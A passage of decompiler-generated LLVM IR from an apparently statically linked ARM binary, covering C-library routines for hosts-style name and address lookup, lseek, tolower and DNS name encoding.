  %v1_1a38821 = inttoptr i32 %v0_1a38820 to i8*
  %v2_1a38822 = load i8, i8* %v1_1a38821, align 1
  %v3_1a38823 = zext i8 %v2_1a38822 to i32
  store i32 %v3_1a38823, i32* %r1.global-to-local, align 4
  %v2_1a38c24 = icmp eq i8 %v2_1a38822, 0
  br i1 %v2_1a38c24, label %dec_label_pc_1a3e8, label %dec_label_pc_1a394

dec_label_pc_1a3e8:                               ; preds = %dec_label_pc_1a3dc.loopexit, %dec_label_pc_1a388.preheader, %dec_label_pc_1a380, %dec_label_pc_1a3dc.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a3ec = load i32, i32* @r6, align 4
  %v1_1a3f0 = load i32, i32* @r4, align 4
  %v5_1a3f0 = mul i32 %v0_1a3ec, 4
  %v6_1a3f0 = add i32 %v1_1a3f0, %v5_1a3f0
  %v7_1a3f0 = inttoptr i32 %v6_1a3f0 to i32*
  store i32 0, i32* %v7_1a3f0, align 4
  %v7_1a3f4 = icmp sgt i32 %v0_1a3ec, 1
  br i1 %v7_1a3f4, label %dec_label_pc_1a3f8, label %dec_label_pc_1a49c

dec_label_pc_1a3f8:                               ; preds = %dec_label_pc_1a3e8
  %v2_1a3f8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1a3f8, i32* %r0.global-to-local, align 4
  %v7_1a3fc = icmp eq i32 %v2_1a3f8, 1
  br i1 %v7_1a3fc, label %dec_label_pc_1a4d0, label %dec_label_pc_1a404

dec_label_pc_1a404:                               ; preds = %dec_label_pc_1a3f8
  %v7_1a404 = icmp eq i32 %v2_1a3f8, 2
  br i1 %v7_1a404, label %dec_label_pc_1a410, label %dec_label_pc_1a43c.preheader

dec_label_pc_1a43c.preheader:                     ; preds = %dec_label_pc_1a404
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1a43c

dec_label_pc_1a410:                               ; preds = %dec_label_pc_1a404
  store i32 %v0_1a1d4, i32* %r0.global-to-local, align 4
  %v0_1a414 = load i32, i32* @r4, align 4
  %v1_1a414 = inttoptr i32 %v0_1a414 to i32*
  %v2_1a414 = load i32, i32* %v1_1a414, align 4
  store i32 %v2_1a414, i32* @r1, align 4
  %v3_1a418 = call i32 @__GI_strcoll(i8* %v2_1a418, i32 %v2_1a414)
  store i32 %v3_1a418, i32* %r0.global-to-local, align 4
  %v2_1a41c = icmp eq i32 %v3_1a418, 0
  br i1 %v2_1a41c, label %dec_label_pc_1a44c, label %dec_label_pc_1a49c

dec_label_pc_1a428:                               ; preds = %dec_label_pc_1a43c
  %v0_1a428 = load i32, i32* @r4, align 4
  %v4_1a428 = mul i32 %v1_1a428, 4
  %v5_1a428 = add i32 %v0_1a428, %v4_1a428
  %v6_1a428 = inttoptr i32 %v5_1a428 to i32*
  %v7_1a428 = load i32, i32* %v6_1a428, align 4
  store i32 %v7_1a428, i32* %r1.global-to-local, align 4
  %v3_1a42c = call i32 @__GI_strcasecmp(i8* %v2_1a418, i32 %v7_1a428)
  store i32 %v3_1a42c, i32* %r0.global-to-local, align 4
  %v2_1a430 = icmp eq i32 %v3_1a42c, 0
  %v0_1a434 = load i32, i32* @r5, align 4
  %v1_1a434 = add i32 %v0_1a434, 1
  store i32 %v1_1a434, i32* @r5, align 4
  br i1 %v2_1a430, label %dec_label_pc_1a44c, label %dec_label_pc_1a43c

dec_label_pc_1a43c:                               ; preds = %dec_label_pc_1a43c.preheader, %dec_label_pc_1a428
  %v1_1a428 = phi i32 [ 1, %dec_label_pc_1a43c.preheader ], [ %v1_1a434, %dec_label_pc_1a428 ]
  %v1_1a43c = load i32, i32* @r6, align 4
  store i32 %v0_1a1d4, i32* %r0.global-to-local, align 4
  %v5_1a444 = icmp slt i32 %v1_1a428, %v1_1a43c
  br i1 %v5_1a444, label %dec_label_pc_1a428, label %dec_label_pc_1a49c

dec_label_pc_1a44c:                               ; preds = %dec_label_pc_1a428, %dec_label_pc_1a410
  store i32 %v0_1a1cc, i32* %r1.global-to-local, align 4
  br i1 %v7_1a450, label %dec_label_pc_1a458, label %dec_label_pc_1a474

dec_label_pc_1a458:                               ; preds = %dec_label_pc_1a44c
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1a45c = load i32, i32* @r7, align 4
  store i32 %v0_1a45c, i32* %r2.global-to-local, align 4
  %v0_1a460 = load i32, i32* @r4, align 4
  %v1_1a460 = inttoptr i32 %v0_1a460 to i32*
  %v2_1a460 = load i32, i32* %v1_1a460, align 4
  store i32 %v2_1a460, i32* %r1.global-to-local, align 4
  %v3_1a464 = inttoptr i32 %v2_1a460 to i8*
  %v4_1a464 = call i32 @inet_pton(i32 2, i8* %v3_1a464, i32 %v0_1a45c)
  store i32 %v4_1a464, i32* %r0.global-to-local, align 4
  %v5_1a46c = icmp sgt i32 %v4_1a464, 0
  br i1 %v5_1a46c, label %dec_label_pc_1a2a8, label %dec_label_pc_1a498

dec_label_pc_1a474:                               ; preds = %dec_label_pc_1a44c
  store i32 %v0_1a1cc, i32* %r2.global-to-local, align 4
  br i1 %v7_1a478, label %dec_label_pc_1a480, label %dec_label_pc_1a498

dec_label_pc_1a480:                               ; preds = %dec_label_pc_1a474
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1a484 = load i32, i32* @r4, align 4
  %v1_1a484 = inttoptr i32 %v0_1a484 to i32*
  %v2_1a484 = load i32, i32* %v1_1a484, align 4
  store i32 %v2_1a484, i32* %r1.global-to-local, align 4
  store i32 %v0_1a350, i32* %r2.global-to-local, align 4
  %v3_1a48c = inttoptr i32 %v2_1a484 to i8*
  %v4_1a48c = call i32 @inet_pton(i32 10, i8* %v3_1a48c, i32 %v0_1a350)
  store i32 %v4_1a48c, i32* %r0.global-to-local, align 4
  %v5_1a494 = icmp sgt i32 %v4_1a48c, 0
  br i1 %v5_1a494, label %dec_label_pc_1a2ec, label %dec_label_pc_1a498

dec_label_pc_1a498:                               ; preds = %dec_label_pc_1a458, %dec_label_pc_1a474, %dec_label_pc_1a480
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_1a49c

dec_label_pc_1a49c:                               ; preds = %dec_label_pc_1a43c, %dec_label_pc_1a410, %dec_label_pc_1a3e8, %dec_label_pc_1a498, %dec_label_pc_1a344
  %v0_1a49c = load i32, i32* @fp, align 4
  store i32 %v0_1a49c, i32* %r0.global-to-local, align 4
  %v0_1a4a0 = load i32, i32* @r8, align 4
  store i32 %v0_1a4a0, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_1a4a8 = call i32 @fgets(i32 %v0_1a49c, i32 %v0_1a4a0, i32 %stack_var_-52.0)
  store i32 %v3_1a4a8, i32* %r0.global-to-local, align 4
  %v2_1a4ac = icmp eq i32 %v3_1a4a8, 0
  br i1 %v2_1a4ac, label %dec_label_pc_1a4b4, label %dec_label_pc_1a35c

dec_label_pc_1a4b4:                               ; preds = %dec_label_pc_1a49c, %dec_label_pc_1a2ec, %dec_label_pc_1a2a8
  %v2_1a4b4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1a4b4, i32* %r3.global-to-local, align 4
  %v7_1a4b8 = icmp eq i32 %v2_1a4b4, 1
  br i1 %v7_1a4b8, label %dec_label_pc_1a4d0, label %dec_label_pc_1a4c0

dec_label_pc_1a4c0:                               ; preds = %dec_label_pc_1a4b4
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_1a4c4 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_1a4c4 = call i32 @__GI_fclose(i8* %v1_1a4c4)
  store i32 %v2_1a4c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a4d0

dec_label_pc_1a4cc:                               ; preds = %dec_label_pc_1a1e8, %bb74, %dec_label_pc_1a23c, %dec_label_pc_1a234, %dec_label_pc_1a228, %dec_label_pc_1a214, %dec_label_pc_1a1f8
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_1a4d0

dec_label_pc_1a4d0:                               ; preds = %dec_label_pc_1a3f8, %dec_label_pc_1a4b4, %dec_label_pc_1a4c0, %dec_label_pc_1a290, %dec_label_pc_1a4cc
  %v0_1a4d0 = load i32, i32* @sl, align 4
  store i32 %v0_1a4d0, i32* %r0.global-to-local, align 4
  store i32 %v3_1a1b8, i32* @r4, align 4
  store i32 %v6_1a1b8, i32* @r5, align 4
  store i32 %v12_1a1b8, i32* @r7, align 4
  store i32 %v15_1a1b8, i32* @r8, align 4
  store i32 %v21_1a1b8, i32* @sl, align 4
  store i32 %v24_1a1b8, i32* @fp, align 4
  ret i32 %v0_1a4d0

; uselistorder directives
  uselistorder i32 %v1_1a428, { 1, 0 }
  uselistorder i32 %v0_1a3ec, { 1, 0 }
  uselistorder i32 %v3_1a38823, { 1, 0 }
  uselistorder i32 %v0_1a38820, { 1, 0 }
  uselistorder i32 %v2_1a364, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_1a264, { 1, 0 }
  uselistorder i32 %v0_1a228, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1a20c, { 1, 0 }
  uselistorder i32 %v0_1a1d8, { 1, 0, 2 }
  uselistorder i32 %v0_1a1cc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1a1c8, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 11, 17, 12, 13, 14, 15, 16, 0, 18, 19, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 21, 22, 23, 24 }
  uselistorder i32* %r2.global-to-local, { 13, 3, 4, 8, 9, 18, 10, 19, 11, 12, 20, 0, 1, 2, 5, 6, 7, 14, 16, 15, 17 }
  uselistorder i32* %r1.global-to-local, { 13, 4, 7, 8, 9, 0, 10, 1, 11, 12, 2, 3, 5, 6, 14 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 7, 2, 3, 0, 8, 9, 6, 1, 4, 10, 5 }
  uselistorder i32 (i8*)* @__GI_fclose, { 3, 4, 0, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 2, 1, 0, 3 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 21, 22, 23, 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 7, { 2, 22, 23, 12, 13, 14, 0, 18, 26, 20, 1, 3, 4, 5, 19, 6, 21, 9, 15, 16, 7, 8, 17, 11, 10, 24, 25 }
  uselistorder i32* @global_var_26250, { 0, 6, 2, 7, 1, 3, 4, 8, 5, 9 }
  uselistorder i32 35, { 0, 2, 3, 4, 1 }
  uselistorder i32 10, { 3, 4, 38, 5, 6, 39, 40, 41, 42, 43, 30, 14, 29, 7, 44, 1, 45, 46, 47, 48, 12, 15, 33, 16, 34, 17, 18, 19, 0, 31, 32, 20, 27, 28, 35, 9, 21, 13, 36, 37, 11, 10, 2, 49, 50, 22, 8, 24, 25, 23, 26, 51 }
  uselistorder i32 12, { 48, 49, 50, 0, 51, 7, 52, 19, 12, 13, 3, 55, 14, 10, 72, 73, 74, 75, 76, 77, 11, 78, 79, 80, 81, 82, 83, 15, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 5, 4, 40, 41, 42, 16, 20, 47, 64, 21, 22, 66, 67, 68, 1, 23, 69, 8, 70, 9, 24, 2, 71, 17, 56, 57, 58, 59, 84, 6, 43, 53, 54, 25, 26, 27, 28, 29, 44, 45, 46, 60, 61, 62, 18, 63, 65 }
  uselistorder i32* @sb, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 1, 2, 24, 25, 26, 27, 28, 29, 30, 31, 32, 3, 4, 33, 34, 35, 36, 37, 38, 5, 6, 7, 8, 9, 10, 0, 11 }
  uselistorder i32 80, { 0, 2, 3, 4, 1, 5, 6 }
  uselistorder i32 48, { 15, 5, 18, 2, 10, 11, 12, 3, 6, 13, 7, 20, 17, 14, 1, 0, 16, 19, 8, 9, 4 }
  uselistorder i32 36, { 10, 11, 12, 14, 15, 16, 17, 4, 1, 13, 0, 7, 8, 9, 2, 3, 5, 18, 6 }
  uselistorder i32 56, { 5, 4, 7, 3, 8, 2, 0, 9, 6, 10, 1 }
  uselistorder i32 44, { 10, 11, 12, 8, 9, 17, 1, 7, 16, 14, 0, 13, 2, 3, 4, 5, 15, 6 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32 -32, { 1, 5, 2, 6, 7, 3, 0, 4 }
  uselistorder i32 32, { 61, 62, 63, 0, 64, 65, 41, 73, 75, 30, 31, 27, 47, 35, 48, 49, 44, 45, 4, 3, 6, 5, 8, 7, 1, 28, 68, 66, 67, 50, 19, 51, 2, 36, 52, 53, 54, 55, 56, 20, 57, 42, 43, 69, 70, 71, 72, 76, 37, 46, 38, 29, 58, 59, 60, 10, 9, 21, 32, 39, 74, 22, 12, 11, 14, 13, 23, 16, 15, 24, 25, 18, 17, 26, 33, 34, 40 }
  uselistorder i32* @fp, { 37, 40, 38, 1, 39, 41, 42, 43, 44, 0, 46, 45, 47, 48, 49, 12, 2, 50, 51, 52, 53, 54, 55, 56, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 3, 4, 5, 6, 7, 8, 9, 10, 11, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 109, 110, 108, 103, 104, 105, 106, 107 }
  uselistorder i32* @sl, { 22, 23, 24, 25, 28, 26, 27, 29, 30, 31, 32, 33, 34, 35, 2, 3, 36, 37, 0, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 4, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 5, 6, 7, 8, 9, 10, 11, 1, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r8, { 33, 34, 35, 36, 37, 38, 39, 5, 6, 7, 40, 45, 46, 0, 47, 82, 83, 84, 85, 1, 86, 87, 88, 89, 21, 22, 97, 98, 8, 9, 10, 11, 12, 13, 14, 96, 90, 91, 92, 93, 94, 95, 23, 24, 25, 26, 27, 28, 3, 4, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 2, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 29, 30, 31, 32, 41, 42, 43, 44, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* @r7, { 66, 68, 69, 67, 70, 71, 72, 73, 74, 75, 9, 10, 11, 12, 13, 14, 15, 1, 76, 84, 83, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 43, 44, 45, 46, 117, 16, 17, 2, 18, 6, 19, 20, 21, 22, 23, 24, 25, 26, 27, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 47, 48, 49, 50, 28, 29, 30, 31, 85, 3, 86, 87, 4, 5, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0, 7, 8, 115, 116, 62, 63, 64, 65, 77, 78, 79, 80, 81, 82, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder label %dec_label_pc_1a4d0, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1a4cc, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1a49c, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1a498, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a43c, { 1, 0 }
  uselistorder label %dec_label_pc_1a3e8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1a388.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1a3c8, { 1, 0 }
  uselistorder label %dec_label_pc_1a344, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_1a1f8, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1a524, label %dec_label_pc_1a510

dec_label_pc_1a510:                               ; preds = %entry
  %v0_1a510 = call i32 @__errno_location()
  %v0_1a514 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a514 = sub i32 0, %v0_1a514
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1a51c = inttoptr i32 %v0_1a510 to i32*
  store i32 %v1_1a514, i32* %v2_1a51c, align 4
  %v0_1a52c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a52c

dec_label_pc_1a524:                               ; preds = %entry
  %v2_1a524 = icmp eq i32 %arg1, 0
  br i1 %v2_1a524, label %dec_label_pc_1a538, label %dec_label_pc_1a52c

dec_label_pc_1a52c:                               ; preds = %dec_label_pc_1a524, %dec_label_pc_1a510
  %v0_1a52c = phi i32 [ %arg1, %dec_label_pc_1a524 ], [ %v0_1a52c.pre, %dec_label_pc_1a510 ]
  br label %dec_label_pc_1a53c

dec_label_pc_1a538:                               ; preds = %dec_label_pc_1a524
  br label %dec_label_pc_1a53c

dec_label_pc_1a53c:                               ; preds = %dec_label_pc_1a52c, %dec_label_pc_1a538
  %v14_1a540 = phi i32 [ %v0_1a52c, %dec_label_pc_1a52c ], [ %tmp9, %dec_label_pc_1a538 ]
  ret i32 %v14_1a540

; uselistorder directives
  uselistorder i32 ()* @__errno_location, { 58, 45, 72, 71, 70, 44, 43, 57, 56, 42, 17, 39, 55, 54, 26, 48, 11, 10, 9, 8, 23, 7, 22, 73, 51, 50, 60, 59, 69, 68, 67, 16, 49, 25, 38, 37, 47, 15, 29, 32, 61, 31, 36, 53, 52, 34, 0, 41, 40, 14, 46, 6, 5, 66, 28, 27, 65, 21, 4, 13, 1, 20, 12, 64, 63, 33, 19, 18, 62, 3, 2, 35, 30, 24 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1a53c, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1a54c = icmp slt i32 %arg1, 0
  br i1 %v1_1a54c, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_1a54c = mul i32 %arg1, 2
  %v2_1a558 = load i32, i32* bitcast (i32** @global_var_2658c.938 to i32*), align 4
  %v2_1a55c = add i32 %v2_1a558, %v2_1a54c
  %v3_1a560 = inttoptr i32 %v2_1a55c to i8*
  %v4_1a560 = load i8, i8* %v3_1a560, align 1
  %v6_1a560 = zext i8 %v4_1a560 to i32
  %v1_1a564 = add i32 %v2_1a55c, 1
  %v2_1a564 = inttoptr i32 %v1_1a564 to i8*
  %v3_1a564 = load i8, i8* %v2_1a564, align 1
  %v4_1a564 = zext i8 %v3_1a564 to i32
  %v3_1a568 = mul nuw i32 %v4_1a564, 16777216
  %v4_1a56c = sdiv i32 %v3_1a568, 65536
  %v5_1a56c = or i32 %v4_1a56c, %v6_1a560
  ret i32 %v5_1a56c

; uselistorder directives
  uselistorder i32 %v2_1a55c, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1a578 = load i32, i32* @r4, align 4
  store i32 %v3_1a578, i32* %stack_var_-24, align 4
  %v6_1a578 = load i32, i32* @r5, align 4
  %v9_1a578 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1a580 = load i32, i32* @r1, align 4
  store i32 %v0_1a580, i32* @r6, align 4
  %v0_1a584 = load i32, i32* @r2, align 4
  store i32 %v0_1a584, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a5ec19 = icmp slt i8* %arg1, null
  store i1 %v1_1a5ec19, i1* %cpsr_n.global-to-local, align 1
  %v2_1a5ec20 = icmp eq i8* %arg1, null
  store i1 %v2_1a5ec20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a5ec20, label %dec_label_pc_1a604, label %dec_label_pc_1a5f8

dec_label_pc_1a590:                               ; preds = %dec_label_pc_1a5f8
  %v2_1a590 = call i32 @__GI_strchr(i32 %v0_1a59021, i32 46)
  store i32 %v2_1a590, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a594 = icmp slt i32 %v2_1a590, 0
  store i1 %v1_1a594, i1* %cpsr_n.global-to-local, align 1
  %v2_1a594 = icmp eq i32 %v2_1a590, 0
  store i1 %v2_1a594, i1* %cpsr_z.global-to-local, align 1
  %v0_1a598 = load i32, i32* @r4, align 4
  %v2_1a598 = sub i32 %v2_1a590, %v0_1a598
  store i32 %v2_1a598, i32* %ip.global-to-local, align 4
  store i32 %v0_1a598, i32* %r0.global-to-local, align 4
  br i1 %v2_1a594, label %dec_label_pc_1a5a4, label %dec_label_pc_1a5ac

dec_label_pc_1a5a4:                               ; preds = %dec_label_pc_1a590
  %v1_1a59c = inttoptr i32 %v0_1a598 to i8*
  %v3_1a5a4 = call i32 @strlen(i8* %v1_1a59c)
  store i32 %v3_1a5a4, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1a5a4, 16777216
  %v1_1a5a8 = sdiv i32 %sext, 16777216
  store i32 %v1_1a5a8, i32* %ip.global-to-local, align 4
  %v0_1a5b8.pre = load i32, i32* @r4, align 4
  %v0_1a5c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a5ac

dec_label_pc_1a5ac:                               ; preds = %dec_label_pc_1a590, %dec_label_pc_1a5a4
  %v0_1a5c8 = phi i32 [ %v2_1a590, %dec_label_pc_1a590 ], [ %v0_1a5c8.pre, %dec_label_pc_1a5a4 ]
  %v0_1a5b8 = phi i32 [ %v0_1a598, %dec_label_pc_1a590 ], [ %v0_1a5b8.pre, %dec_label_pc_1a5a4 ]
  %v0_1a5d8 = phi i32 [ %v2_1a598, %dec_label_pc_1a590 ], [ %v1_1a5a8, %dec_label_pc_1a5a4 ]
  %v0_1a5ac = load i32, i32* %r7.global-to-local, align 4
  %v1_1a5ac = add i32 %v0_1a5ac, 1
  store i32 %v1_1a5ac, i32* @lr, align 4
  %v1_1a5b0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1a5b0 = sub i32 %v1_1a5b0, %v0_1a5ac
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a5b4 = icmp slt i32 %v0_1a5d8, 0
  store i1 %v1_1a5b4, i1* %cpsr_n.global-to-local, align 1
  %v2_1a5b4 = icmp eq i32 %v0_1a5d8, 0
  store i1 %v2_1a5b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1a5b8, i32* @r1, align 4
  %v0_1a5bc = load i32, i32* @r6, align 4
  %v2_1a5bc = add i32 %v0_1a5bc, %v1_1a5ac
  store i32 %v2_1a5bc, i32* @r0, align 4
  store i32 %v0_1a5d8, i32* @r2, align 4
  %v1_1a5c4 = add i32 %v2_1a5b0, -1
  %v1_1a5c8 = add i32 %v0_1a5c8, 1
  store i32 %v1_1a5c8, i32* @r4, align 4
  br i1 %v2_1a5b4, label %.loopexit, label %dec_label_pc_1a5d0

dec_label_pc_1a5d0:                               ; preds = %dec_label_pc_1a5ac
  %v2_1a5d0 = sub i32 %v0_1a5d8, %v1_1a5c4
  %v3_1a5d0 = icmp ult i32 %v0_1a5d8, %v1_1a5c4
  %v4_1a5d0 = xor i32 %v1_1a5c4, %v0_1a5d8
  %v5_1a5d0 = xor i32 %v2_1a5d0, %v0_1a5d8
  %v6_1a5d0 = and i32 %v5_1a5d0, %v4_1a5d0
  %v7_1a5d0 = icmp slt i32 %v6_1a5d0, 0
  store i1 %v7_1a5d0, i1* %cpsr_v.global-to-local, align 1
  %v8_1a5d0 = icmp slt i32 %v2_1a5d0, 0
  store i1 %v8_1a5d0, i1* %cpsr_n.global-to-local, align 1
  %v9_1a5d0 = icmp eq i32 %v0_1a5d8, %v1_1a5c4
  store i1 %v9_1a5d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1a5d0, label %dec_label_pc_1a5d8, label %.loopexit

dec_label_pc_1a5d8:                               ; preds = %dec_label_pc_1a5d0
  %v1_1a5d8 = trunc i32 %v0_1a5d8 to i8
  %v4_1a5d8 = add i32 %v0_1a5bc, %v0_1a5ac
  %v5_1a5d8 = inttoptr i32 %v4_1a5d8 to i8*
  store i8 %v1_1a5d8, i8* %v5_1a5d8, align 1
  %v0_1a5dc = load i32, i32* @lr, align 4
  %v1_1a5dc = load i32, i32* %ip.global-to-local, align 4
  %v2_1a5dc = add i32 %v1_1a5dc, %v0_1a5dc
  store i32 %v2_1a5dc, i32* %r7.global-to-local, align 4
  %v0_1a5e0 = call i32 @memcpy()
  store i32 %v0_1a5e0, i32* %r0.global-to-local, align 4
  %v0_1a5e4 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a5e4 = icmp slt i32 %v0_1a5e4, 0
  store i1 %v1_1a5e4, i1* %cpsr_n.global-to-local, align 1
  %v2_1a5e4 = icmp eq i32 %v0_1a5e4, 0
  store i1 %v2_1a5e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a5e4, label %dec_label_pc_1a604, label %dec_label_pc_1a5d8.dec_label_pc_1a5ec_crit_edge

dec_label_pc_1a5d8.dec_label_pc_1a5ec_crit_edge:  ; preds = %dec_label_pc_1a5d8
  %v0_1a5ec.pre = load i32, i32* @r4, align 4
  store i32 %v0_1a5ec.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a5ec = icmp slt i32 %v0_1a5ec.pre, 0
  store i1 %v1_1a5ec, i1* %cpsr_n.global-to-local, align 1
  %v2_1a5ec = icmp eq i32 %v0_1a5ec.pre, 0
  store i1 %v2_1a5ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a5ec, label %dec_label_pc_1a604, label %dec_label_pc_1a5f8

dec_label_pc_1a5f8:                               ; preds = %entry, %dec_label_pc_1a5d8.dec_label_pc_1a5ec_crit_edge
  %v0_1a59021 = phi i32 [ %v0_1a5ec.pre, %dec_label_pc_1a5d8.dec_label_pc_1a5ec_crit_edge ], [ %tmp, %entry ]
  %v1_1a5f8 = inttoptr i32 %v0_1a59021 to i8*
  %v2_1a5f8 = load i8, i8* %v1_1a5f8, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a5fc = icmp eq i8 %v2_1a5f8, 0
  store i1 %v2_1a5fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a5fc, label %dec_label_pc_1a604, label %dec_label_pc_1a590

dec_label_pc_1a604:                               ; preds = %dec_label_pc_1a5d8.dec_label_pc_1a5ec_crit_edge, %dec_label_pc_1a5d8, %dec_label_pc_1a5f8, %entry
  %v0_1a604 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a604 = icmp slt i32 %v0_1a604, 0
  store i1 %v1_1a604, i1* %cpsr_n.global-to-local, align 1
  %v2_1a604 = icmp eq i32 %v0_1a604, 0
  store i1 %v2_1a604, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_1a604, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1a604
  %v5_1a60c = load i32, i32* %r7.global-to-local, align 4
  %v6_1a60c = add i32 %v5_1a60c, 1
  store i32 %v6_1a60c, i32* %r0.global-to-local, align 4
  %v7_1a610 = load i32, i32* @r6, align 4
  %v9_1a610 = add i32 %v7_1a610, %v5_1a60c
  %v10_1a610 = inttoptr i32 %v9_1a610 to i8*
  store i8 0, i8* %v10_1a610, align 1
  %v0_1a614.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1a614.pre = load i1, i1* %cpsr_n.global-to-local, align 1
